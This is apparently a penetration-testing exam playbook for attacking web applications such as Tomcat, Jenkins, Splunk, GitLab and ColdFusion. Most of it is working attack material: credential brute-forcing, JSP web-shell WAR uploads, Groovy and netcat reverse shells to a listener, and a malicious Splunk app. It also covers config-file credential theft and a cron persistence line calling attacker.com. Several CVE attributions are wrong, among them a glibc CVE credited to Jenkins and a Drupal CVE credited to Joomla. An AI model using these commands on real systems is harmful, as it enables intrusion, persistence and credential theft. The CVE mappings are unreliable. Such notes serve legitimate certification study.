# NOTE — Attacking Common Applications: Exam Playbook

## ID
710

## Module
Attacking Common Applications

## Kind
methodology

## Title
Attacking Common Applications — Full Exploitation Methodology

## Description
End-to-end exam-ready playbook for identifying, authenticating, and exploiting web-based applications (Tomcat, Jenkins, Splunk, GitLab, ColdFusion, IIS, LDAP) via default credentials, CVEs, and functional abuse (RCE via web shells, script consoles, file uploads, metadata parsing).

## Tags
methodology, web-applications, cms, app-servers, rce, exploit, default-creds, web-shell, cve, tomcat, jenkins, splunk, gitlab, coldfusion, joomla, wordpress, drupal, exam, cheatsheet

---

## TL;DR — The 5-Phase Flow

1. **Discovery & Enumeration** — identify running apps, versions, vHosts via Nmap + EyeWitness/Aquatone.
2. **Credential Acquisition** — try default creds, brute-force, or unauthenticated CVE paths.
3. **Functional Reconnaissance** — map app features (upload, script console, task runner) for RCE candidates.
4. **Exploitation** — execute RCE (web shell, CVE, built-in code execution).
5. **Post-Exploitation** — extract config files, credentials, pivot to internal services.

> **Golden rule:** When you find an app with admin/default creds, RCE via script console or admin features beats exploit chaining. Jenkins → Groovy console, Splunk → custom app, Tomcat → WAR upload.

> **OPSEC fork:** If brute-forcing hangs or gets rate-limited, **skip to CVE phase** (Ghostcat, ExifTool, etc.) or **pivot to password spraying across multiple apps** — one weak shared password may work everywhere.

---

## Phase 1 — Discovery & Enumeration

**Goal:** catalog all web applications, their versions, and accessibility.

**Trigger/Precondition table:**

| Scenario | Command |
|----------|---------|
| Initial scope: target IP + unknown apps | `sudo nmap <TARGET> -p 80,443,8000-8100 --open -oA discovery` |
| Scope list with vHosts | `sudo nmap -iL scopeList -p 80,443,8080,8180,8888 --open -oA discovery` |
| Screenshot web apps (EyeWitness) | `eyewitness --web -x discovery.xml -d screenshots` |
| Screenshot web apps (Aquatone) | `cat discovery.xml \| aquatone -nmap -out aquatone_out` |
| Service version details | `sudo nmap <TARGET> --open -sV -p- \| grep -E "^[0-9]+/tcp"` |

**Key commands:**

```bash
# 1. Broad Nmap scan on common web ports
sudo nmap <TARGET_IP> -p 80,443,8000,8080,8180,8888,10000 --open -oA webDiscovery

# 2. Feed into EyeWitness for automated screenshots
eyewitness --web -x webDiscovery.xml -d eyewitness_out

# 3. Alternative: Aquatone (faster, different UI)
cat webDiscovery.xml | aquatone -nmap -out aquatone_out

# 4. Service version detection (slow but detailed)
sudo nmap <TARGET_IP> -p- --open -sV | tee services.txt

# 5. Add vHosts to /etc/hosts (do this BEFORE screenshots)
sudo printf "%s\t%s\n" "$TARGET_IP" "app.domain.local dev.domain.local" | sudo tee -a /etc/hosts
```

**Output checkpoint:** After this phase you have:
- Screenshot report with all web services fingerprinted
- Version info for each app (Tomcat 8.5.3, Jenkins 2.3, GitLab 13.10.2, etc.)
- List of low-hanging fruit: dev hosts, default cred candidates (e.g., `/admin`, `/manager`)

**High-value targets to prioritize:**
- Jenkins, Tomcat (servlet containers → RCE)
- GitLab, Bitbucket (repo access → creds/SSTI)
- Splunk, LogRhythm (SIEM → logs, credentials)
- PRTG, ManageEngine (network monitoring → creds)
- ColdFusion, IIS with CFIDE (directory traversal + RCE)

---

## Phase 2 — Credential Acquisition

**You have:** app version + UI access.  
**Goal:** gain authenticated access via default creds, brute-force, or unauthenticated RCE.

**Trigger/Precondition table:**

| App | Default User | Default Pass | Path | CVE if Unauth |
|-----|--------------|--------------|------|---------------|
| Tomcat Manager | tomcat | tomcat | `/manager/html` | — (auth req'd) |
| Jenkins | admin | (blank or `admin`) | `/script` (console) | CVE-2019-1010022 (script console pre-9.x) |
| Splunk | admin | changeme | `/en-US/account/login` | — (auth req'd) |
| GitLab | — (self-register) | — | `/users/sign_up` | CVE-2021-22205 (auth req'd) |
| ColdFusion 8 | admin | (no default) | `/CFIDE/` | CVE-2010-2861 (dir traversal) + CVE-2009-2265 (FCKeditor RCE) |
| WordPress | admin | varies | `/wp-login.php` | Multiple plugin vulns |
| Joomla | admin | varies | `/administrator` | CVE-2019-6340 (REST API RCE) |
| osTicket | — | — | `/scp/login.php` | CVE-2020-24881 (pre-auth RCE) |
| PRTG | prtgadmin | prtgadmin | `/login.htm` | CVE-2018-9995 (auth bypass) |

**Branch A: Try Default Credentials First (Fastest)**

```bash
# 1. Collect default username lists
cat > default_users.txt <<EOF
admin
tomcat
jenkins
root
system
test
guest
EOF

cat > default_passes.txt <<EOF
admin
tomcat
password
admin123
changeme
test
(blank)
EOF

# 2. Manual browser test (if only a few targets)
curl -u admin:tomcat http://<TARGET>:8080/manager/html -I

# 3. Metasploit brute-forcer (Tomcat example)
msfconsole -q
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <TARGET>
set RPORT 8080
set VHOST <VHOST>
set STOP_ON_SUCCESS true
run

# 4. Hydra for web forms (Jenkins example)
hydra -L users.txt -P passes.txt <TARGET> http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=Invalid"
```

**Branch B: Unauthenticated CVE Exploitation (Skip Creds)**

```bash
# ColdFusion 8 — Directory Traversal (no auth needed)
python2 /usr/share/exploitdb/exploits/cfm/webapps/14641.py <TARGET> 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

# GitLab — ExifTool RCE (auth needed, but try self-register first)
python3 /usr/share/exploitdb/exploits/ruby/webapps/49951.py -t http://<TARGET>:8081 -u testuser -p testpass -c "id"

# Tomcat — AJP Ghostcat (CVE-2020-1938 — no auth needed, port 8009)
git clone https://github.com/NHPT/ghostcat-CNVD-2020-10487.git
python3 ghostcat-CNVD-2020-10487/exploit.py <TARGET> 8009 /WEB-INF/web.xml
```

**Output checkpoint:** After this phase you have:
- Valid credentials (username:password) for at least one app
- **OR** a direct RCE vector via CVE (e.g., Ghostcat file read → version confirmation → next CVE)

---

## Phase 3 — Functional Reconnaissance

**You have:** authenticated access or unauthenticated app version.  
**Goal:** identify RCE-enabling features (upload, script console, task runner, file write).

**Per-app matrix:**

| App | RCE Feature | Path | Privilege Req | Output |
|-----|-------------|------|---------------|--------|
| **Tomcat** | WAR file upload | `/manager/html` → Deploy | admin | RCE as Tomcat user |
| **Jenkins** | Groovy script console | `/script` | admin | RCE as Jenkins user |
| **Splunk** | Custom app upload | `/en-US/app/launcher/install_app_from_file` | admin | RCE as Splunk user |
| **GitLab** | ExifTool RCE (CVE-2021-22205) | `/api/v4/projects/:id/uploads` | user (any) | RCE as `git` user |
| **ColdFusion** | FCKeditor upload (CVE-2009-2265) | `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm` | none | RCE as ColdFusion user |
| **WordPress** | Plugin upload (if user role allows) | `/wp-admin/plugin-install.php` | editor+ | RCE as web server user |
| **Joomla** | REST API RCE (CVE-2019-6340) | `/api/index.php/v1/articles` | none (config) | RCE as web server user |
| **IIS + CFIDE** | Cold Fusion dir traversal | `/CFIDE/wizards/common/_logintowizard.cfm?locale=../../..` | none | LFI → creds → auth |

**Commands to map functionality:**

```bash
# 1. Manual app reconnaissance — log in and explore
#    - Look for: file upload, script console, task scheduler, API endpoints
#    - Check: /admin, /settings, /console, /api/v1, /script, /groovy

# 2. Grep app logs/source for interesting endpoints
curl -s http://<TARGET>:8080/ | grep -iE "(script|console|admin|upload|api)" | head -20

# 3. Use Burp: intercept requests, check POST endpoints for file upload
burpsuite &
# Navigate web app, look for multipart/form-data POSTs

# 4. Check app for version-specific CVEs
searchsploit "tomcat 8.5"
searchsploit "jenkins 2.3"
```

**Output checkpoint:** After this phase you have:
- Specific feature/endpoint for RCE (e.g., "Tomcat Manager at /manager/html")
- Exact payload type needed (WAR, custom app, script, upload)

---

## Phase 4 — Exploitation

**You have:** auth creds + identified RCE path.  
**Goal:** execute code and land shell.

**4A — Web Shell Upload (Tomcat, ColdFusion, WordPress)**

```bash
# Tomcat WAR upload
# 1. Create WAR with JSP web shell
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r shell.war cmd.jsp

# 2. Deploy via Manager
curl -u admin:tomcat --upload-file shell.war \
  http://<TARGET>:8080/manager/text/deploy?path=/shell

# 3. Test shell
curl "http://<TARGET>:8080/shell/cmd.jsp?cmd=id"

# ColdFusion — FCKeditor upload (unauthenticated)
python3 /usr/share/exploitdb/exploits/cfm/webapps/50057.py
# (edit script to set lhost, lport, rhost, rport)
# Spawns reverse shell as ColdFusion user
```

**4B — Script Console RCE (Jenkins, Groovy)**

```bash
# Jenkins Groovy console (authenticated)
# Navigate: http://<TARGET>:8080/script
# Paste Groovy payload:

# Linux reverse shell
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

# Windows reverse shell (alternative)
String host="<LHOST>";
int port=<LPORT>;
String cmd="cmd.exe";
ProcessBuilder pb = new ProcessBuilder(cmd);
...
# OR use one-liner: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "..."
```

**4C — Custom App RCE (Splunk)**

```bash
# 1. Clone reverse shell template
git clone https://github.com/0xjpuff/reverse_shell_splunk.git
cd reverse_shell_splunk

# 2. Edit inputs.conf to run shell
vim reverse_shell_splunk/default/inputs.conf
# Set correct shell command (PowerShell for Windows, Python for Linux)

# 3. Tar and upload
tar -cvzf shell.tar.gz reverse_shell_splunk/

# 4. Upload via Splunk UI (Apps → Install app from file)
# OR via CLI: /opt/splunk/bin/splunk install app shell.tar.gz -auth admin:password

# 5. Start listener
nc -lnvp <LPORT>

# 6. Shell should trigger on next interval (~10 seconds)
```

**4D — CVE-Specific Exploitation**

```bash
# GitLab CVE-2021-22205 (ExifTool RCE)
python3 /usr/share/exploitdb/exploits/ruby/webapps/49951.py \
  -t http://gitlab.inlanefreight.local:8081 \
  -u attacker -p password \
  -c "nc -e /bin/bash <LHOST> <LPORT>"
# (assumes you have user creds; self-register if allowed)

# Tomcat Ghostcat CVE-2020-1938 (AJP, no auth)
python3 ghostcat.py <TARGET> 8009 /WEB-INF/web.xml
# Gives config → database creds → RCE via other service

# ColdFusion CVE-2010-2861 + 2009-2265
# See Phase 2 for directory traversal
# Then CVE-2009-2265 for unauthenticated RCE
```

**Output checkpoint:** After this phase you have:
- Interactive shell as app user (Tomcat, Jenkins, Splunk, ColdFusion, etc.)

---

## Phase 5 — Post-Exploitation

**You have:** shell as app user.  
**Goal:** extract creds, pivot, escalate to system user or lateral move.

**Key artifacts by app:**

| App | Config Files | Credential Locations | Pivot Targets |
|-----|--------------|----------------------|---------------|
| Tomcat | `$CATALINA_HOME/conf/tomcat-users.xml` | Database creds in app code | MySQL, MSSQL, LDAP |
| Jenkins | `$JENKINS_HOME/secrets/` | GitHub tokens, credentials.xml | Git repos, APIs |
| Splunk | `$SPLUNK_HOME/etc/apps/*/default/inputs.conf` | `outputs.conf` (auth, forwarding) | Syslog servers, HEC receivers |
| ColdFusion | `$CF_HOME/lib/password.properties` | Database configs (encrypted) | LDAP, databases |
| WordPress | `wp-config.php` | Database credentials | MySQL (read blogs, users, posts) |
| GitLab | `/etc/gitlab/gitlab.rb`, `/var/opt/gitlab/` | Database creds, API tokens | Git repos (extract source), LDAP |

**Exploitation flow:**

```bash
# 1. Enumerate privileges
whoami
id
sudo -l            # Can current user run anything as root/system?
groups             # Group membership?

# 2. Extract app-specific credentials
cat /var/www/html/wp-config.php | grep DB_
cat /opt/tomcat/conf/tomcat-users.xml
cat $JENKINS_HOME/credentials.xml
cat /etc/gitlab/gitlab.rb | grep -E "password|token|secret"

# 3. Test extracted creds against other services
# Found database creds? Try connecting:
mysql -u wordpress -p'password' -h localhost wordpress

# Found LDAP config? Try LDAP queries:
ldapsearch -x -H ldap://<LDAP_SERVER> -b "dc=domain,dc=local" \
  -D "cn=admin,dc=domain,dc=local" -w password "(uid=*)" 2>/dev/null

# 4. Lateral movement (if app runs with high privilege)
# Is Tomcat/Jenkins running as root? Spawn shell as root
# If SYSTEM (Windows): use runas or token impersonation

# 5. Persistence (if time permits)
# Add reverse shell to cron: echo "* * * * * nc -e /bin/bash attacker.com 4444" | crontab -
# Or modify app startup: echo shell >> /opt/tomcat/bin/startup.sh
```

**Output checkpoint:** After this phase you have:
- Credentials for other services (databases, LDAP, APIs)
- System user shell (if privilege escalation possible)
- Lateral movement targets identified

---

## Decision Tree (Under Exam Pressure)

```
┌─ Enumerate apps via Nmap + EyeWitness
│
├─ App version known?
│  ├─ YES → Check searchsploit for CVE (Ghostcat, ExifTool, etc.)
│  │         ├─ Unauthenticated RCE exists?
│  │         │  ├─ YES → Use it (skip creds phase)
│  │         │  └─ NO → Try default creds (Phase 2)
│  │         └─ Auth required → Try creds
│  │
│  └─ NO → Brute-force version via HTTP headers / banner grab
│           └─ Retry exploit search
│
├─ Credentials acquired?
│  ├─ YES → Log in, map RCE features (Phase 3)
│  │         ├─ Script console? (Jenkins, ColdFusion) → Groovy/CFML RCE
│  │         ├─ File upload? (Tomcat, Splunk) → Web shell / custom app
│  │         ├─ API? (GitLab, WordPress) → CVE chain or RCE endpoint
│  │         └─ NO RCE feature found? → Check backup CVEs or pivot
│  │
│  └─ NO creds acquired after 10 min brute-force?
│      ├─ STUCK > 5 min → Switch to CVE exploitation (if available)
│      ├─ STUCK > 10 min → Pivot to different app (most apps have >1 vector)
│      └─ STUCK > 15 min → Password spray (one weak password may work everywhere)
│
├─ Shell acquired?
│  ├─ YES → Extract creds (Phase 5), pivot to high-value services
│  └─ NO → Check error output
│          ├─ "Permission denied" → Try different upload path or payload encoding
│          ├─ "Command not found" → Groovy/script engine issue; check syntax
│          └─ "File exists" → App already deployed; undeploy first
│
└─ Privilege escalation?
   ├─ App runs as root/SYSTEM? → Immediate system compromise
   ├─ App runs as unprivileged user? → Enum for kernel exploits, sudo abuse
   └─ STUCK > 10 min → Document and move to lateral movement (creds from config files)
```

---

## Signal → Counter-Move Table

| Symptom | Likely Cause | Exact Fix |
|---------|--------------|-----------|
| Brute-force hangs on Tomcat login | HTTP Basic Auth negotiation slow or app overloaded | Use Metasploit module instead (parallel threads); skip to Ghostcat CVE |
| Jenkins script console returns "groovy.lang.MissingMethodException" | Syntax error or Java method doesn't exist (e.g., wrong ProcessBuilder) | Check Groovy syntax; use `def sout = new StringBuffer()` pattern instead |
| WAR file upload succeeds but app doesn't appear in manager | Container restart required after deploy | Check `/manager/html` refresh; try curl to `/shell/cmd.jsp` manually |
| ColdFusion directory traversal returns empty file | Incorrect path traversal depth (`../`) | Count slashes; CF 8 is typically at `$CATALINA_HOME/../ColdFusion8/lib/` |
| GitLab ExifTool RCE fails with "User account not found" | Self-registration disabled or account locked | Try creds from OSINT; check if registration form shows "Sign up" button |
| Splunk custom app doesn't execute shell | `inputs.conf` disabled or syntax error | Check: `disabled = 0`, correct script path `./bin/` or `.\bin\`, interval in seconds |
| MySQL/LDAP creds extracted but connection fails | Credentials encrypted in config OR service not accessible from app user's context | Try decrypting with app-specific tools; verify network connectivity from app container |
| Shell command execution times out | Network connectivity issue or payload too large | Use shorter payloads; test connectivity with `ping`; try reverse shell variants |

---

## Master Cheatsheet — One-Liners by Scenario

### Quick App Discovery
```bash
# All web ports in one shot
nmap <TARGET> -p 80,443,8000-8100 --open -oX - | aquatone -nmap

# Screenshot everything
eyewitness --web -f <(nmap <TARGET> -p 80,443,8080 -oX - | grep -oP 'portid state="open".*?port="[0-9]+"') -d out
```

### Tomcat RCE Chain
```bash
# All-in-one: brute-force + WAR upload + execute
msfconsole -q -x "use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS <T>; set RPORT 8080; run"
# Then manually upload shell.war via manager, curl http://<T>:8080/shell/cmd.jsp?cmd=id
```

### Jenkins RCE (Groovy One-Liner)
```bash
curl -u admin:admin http://<TARGET>:8080/scriptText \
  -d "script=Runtime.getRuntime().exec('id')" -X POST
# Captures output in response (may be truncated)

# Reverse shell (copy-paste into Script Console):
r=Runtime.getRuntime(); p=r.exec(["/bin/bash","-c","nc -e /bin/bash <LHOST> <LPORT>"] as String[]); p.waitFor()
```

### ColdFusion RCE (CVE-2009-2265 One-Liner)
```bash
# Exploit ready at /usr/share/exploitdb/exploits/cfm/webapps/50057.py
python3 50057.py && nc -lnvp 4444
```

### GitLab User Enum + RCE
```bash
# Enumerate valid users
bash 49821.sh --url http://gitlab.inlanefreight.local:8081 --userlist /opt/useful/seclists/Usernames/default-usernames.txt

# RCE with found user (if self-reg works, use new account)
python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u user -p pass -c "whoami"
```

### Splunk Custom App RCE
```bash
# One-liner Splunk shell deployment (Linux)
git clone https://github.com/0xjpuff/reverse_shell_splunk.git && \
  tar -czf shell.tar.gz reverse_shell_splunk/ && \
  # Upload shell.tar.gz via UI or: curl -k -u admin:changeme https://<T>:8089/services/apps/local -F "update=@shell.tar.gz"
```

### Database Credential Extraction + Pivot
```bash
# Extract MySQL creds from WordPress
grep DB_ /var/www/html/wp-config.php | grep -oP "(?<=')[^']*(?=')" | head -4

# Test MySQL access
mysql -u wordpress -p$(grep DB_PASSWORD /var/www/html/wp-config.php | grep -oP "(?<=')[^']*(?=')") -h localhost wordpress -e "SELECT user_login, user_pass FROM wp_users LIMIT 5;"
```

---

## Quick Reference — Tools by Function

| Function | Tool | Command | When to Use |
|----------|------|---------|------------|
| App discovery | Nmap | `nmap -p 80,443,8000-8100 --open <T>` | First scan |
| App screenshot | EyeWitness | `eyewitness --web -x discovery.xml -d out` | Fingerprint web services |
| App screenshot | Aquatone | `cat discovery.xml \| aquatone -nmap` | Faster than EyeWitness |
| Cred brute-force | Metasploit | `use auxiliary/scanner/http/tomcat_mgr_login` | Tomcat, HTTP Basic |
| Cred brute-force | Hydra | `hydra -L users.txt -P passes.txt <T> http-post-form "..."` | Web form login |
| Web shell | JSP web shell | Download + `zip -r shell.war cmd.jsp` | Tomcat, ColdFusion |
| Web shell | Burp Suite | Repeater + Intruder for file upload | Interactive testing |
| Script console | Groovy | Paste into Jenkins `/script` | Jenkins RCE |
| Script console | CFML | Paste into ColdFusion admin | ColdFusion RCE |
| Custom app | Splunk app | `git clone reverse_shell_splunk && tar -czf ...` | Splunk RCE |
| CVE exploit | searchsploit | `searchsploit "app version"` | Any CVE-based RCE |
| CVE exploit | Exploit-DB | `python3 <EDB_NUMBER>.py <TARGET>` | ColdFusion, GitLab CVEs |
| Reverse shell | nc | `nc -e /bin/bash <LHOST> <LPORT>` | Lightweight shell |
| Reverse shell | bash | `/bin/bash -i >& /dev/tcp/...` | No nc available |
| Reverse shell | PowerShell | `powershell -NoP -NonI -W Hidden -c "..."` | Windows |
| Credential extraction | grep | `grep -r "password\|secret\|token" .` | Config file mining |
| Database access | mysql | `mysql -u user -p password -h host database` | Pivot after credential theft |
| LDAP query | ldapsearch | `ldapsearch -x -H ldap://<T> -b "dc=..."` | Directory enumeration |

---

## Top Gotchas (Exam Time Killers)

1. **vHosts not added to `/etc/hosts`** — You scan `:80` but the app is at `app.domain.local:80`. Screenshots fail silently. **Fix:** Always add vHosts *before* running EyeWitness. Even if FQDN unknown, check HTTP headers: `curl -v http://<IP>/ 2>&1 | grep -i host`.

2. **Default creds are app-specific, not universal** — Tomcat is `tomcat:tomcat`, Splunk is `admin:changeme`, Jenkins is `admin:admin`. Trying one set on all apps wastes time. **Fix:** Create a per-app creds matrix; try most likely first (admin/admin, admin/changeme).

3. **Script console syntax varies by language** — Groovy (Jenkins) is not CFML (ColdFusion). Pasting Groovy into CF returns "Command not found." **Fix:** Know the app's scripting engine *before* you write payload; test syntax in sandbox first.

4. **WAR/app deployment requires container restart** — Upload succeeds but app doesn't show up. Tomcat needs `/manager/text/undeploy` then re-upload. Splunk needs interval or manual trigger. **Fix:** Check `/manager/html` *after* upload; if missing, check catalina.out logs.

5. **Metasploit modules get stuck on unreachable hosts** — `tomcat_mgr_login` hangs indefinitely if target is slow or filtered. **Fix:** Set `STOP_ON_SUCCESS true` and timeout after 5 min; switch to direct curl brute-force or CVE if scanning takes >10 min.

6. **Unauthenticated CVEs require *exact* version match** — Ghostcat (CVE-2020-1938) works on Tomcat 5.5–9.0.30; misidentifying version wastes 10 min. **Fix:** Run `sudo nmap -sV` to get detailed version; cross-check with searchsploit before exploit.

7. **File upload filter bypasses are app-specific** — WordPress checks MIME type; Tomcat/ColdFusion may not. Uploading `cmd.jsp` fails if filter rejects `.jsp`. **Fix:** Know the app's upload whitelist; try `.jspx`, `.jsp.png`, or `Content-Type: image/jpeg` header tricks.

8. **Reverse shell payload encoding/escaping is fragile** — Shell command fails due to `$`, backticks, or quotes. `exec 5<>/dev/tcp/...` breaks if `/bin/bash` doesn't recognize it. **Fix:** Test locally first; use base64 encoding if special chars fail: `echo "payload" | base64` then decode on target.

9. **Extracted database credentials don't work directly** — MySQL creds found in WordPress config fail if user is localhost-only and you're trying from a different host. **Fix:** Always check the config for `host` and `user` fields; test from the app's container context first (shell as app user).

10. **Pivoting without credential extraction fails silently** — You gain shell but can't move to internal LDAP/MSSQL because app has no creds in config (they're in memory or external vault). **Fix:** Immediately check `/proc/<PID>/environ` and running processes (`ps aux`) for env vars leaking creds; if none, focus on user compromise via cracking web session tokens.

---

## Related Vault Notes

- [[02-attacking_common_applications_app_discovery_enumeration]] — Discovery tools + vHost setup
- [[09-tomcat-discovery-enumeration]] + [[10-attacking-tomcat]] — Tomcat brute-force + WAR RCE
- [[11-jenkins-discovery-enumeration]] + [[12-attacking-jenkins]] — Jenkins Groovy console RCE
- [[13-splunk-discovery-enumeration]] + [[14-attacking-splunk]] — Splunk custom app RCE
- [[17-gitlab-discovery-enumeration]] + [[18-attacking-gitlab]] — GitLab enumeration + CVE-2021-22205
- [[23-coldfusion-discovery-enumeration]] + [[24-attacking-coldfusion]] — ColdFusion CVE-2010-2861 + CVE-2009-2265
- [[25-iis-tilde-enumeration]] — IIS short filename enumeration
- [[26-attacking-ldap]] — LDAP injection + credential extraction
- [[3-attacking_common_applications_wordpress_discovery_enumeration]] + [[4-attacking_common_applications_attacking_wordpress]] — WordPress recon + plugin abuse
- [[05-iis-tilde-enumeration]] → [[06-attacking_common_applications_attacking_joomla]] — CMS attack chain

**Chain this methodology with:**
- [[../ad-enum-attacks/00-METHODOLOGY]] — If app gives domain/LDAP access
- [[../pivoting-tunneling/00-METHODOLOGY]] — For lateral movement after app compromise
- [[../sql-injection-fundamentals/00-METHODOLOGY]] — If CMS/app has SQLi vulnerability

---

## Triage Backlink

**Symptom-to-note lookup:** Use [[../ATTACK-PATHS]] to find this methodology by symptom:
- "Found web server with unknown app" → Attacking Common Applications
- "Port 8080/8180 open" → Likely Tomcat/app server → this module
- "Port 8000 (Splunk), 8089 (Splunk HEC)" → SIEM compromise
- "Found WordPress/Joomla/Drupal" → CMS-specific notes in this module

---

**Exam Ready.** Print this. When you land shell on an app, jump to Phase 5 (post-exploit). If stuck on creds > 10 min, flip to "Decision Tree (Under Exam Pressure)."
